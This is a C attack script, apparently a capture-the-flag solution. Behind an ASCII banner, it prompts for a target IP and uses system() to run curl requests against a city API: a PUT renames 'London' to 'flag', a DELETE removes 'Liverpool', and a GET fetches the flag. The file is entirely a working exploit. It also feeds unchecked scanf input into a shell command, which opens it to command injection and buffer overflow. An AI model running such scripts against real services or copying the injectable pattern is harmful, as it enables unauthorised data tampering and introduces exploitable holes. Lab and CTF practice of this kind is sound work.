#include <stdio.h>
#include <stdlib.h>

void printAsciiArt()
{
    const char *asciiArt =
"    ___    ____        __             \n"
"   /   |  / __ \\      / /_  __  _____ \n"
"  / /| | / /_/ /_____/ __ \\/ / / / _ \\\n"
" / ___ |/ ____/_____/ /_/ / /_/ /  __/\n"
"/_/  |_/_/         /_.___/\\__, /\\___/ \n"
"                         /____/       \n";
    printf("%s", asciiArt);
}

int main(void)
{
    char url[] = "/api.php/city/";
    char payload0[] = "{\"city_name\":\"flag\"}";
    char payload1[] = "Liverpool";
    char payload2[] = "flag";
    char ipInput[130];
    char command[512];

    printAsciiArt();

    printf("Enter the target IP address:");

    scanf("%s",ipInput);

    sprintf(command, "curl -s -X PUT --data-raw '%s' -H 'Content-Type: application/json' %s%sLondon", payload0, ipInput, url);

    printf("[~] Executing Payload [%s]\n", command);

    printf("[~] Making cURL request...\n\n"); 
    
    system(command);

    printf("\n[::] Request completed!\n\n");


    sprintf(command, "curl -s -X DELETE %s%s%s", ipInput, url, payload1);

    printf("[~] Executing Payload [%s]\n", command);

    printf("[~] Making cURL request...\n\n");

    system(command);

    printf("\n[::] Request completed!\n\n");


    sprintf(command, "curl -s -X GET %s%s%s | jq", ipInput, url, payload2);

    printf("[~] Executing Payload [%s]\n", command);

    printf("[~] Making cURL request...\n\n");

    system(command);

    printf("\n[::] Request completed!\n");
    return 0;
}
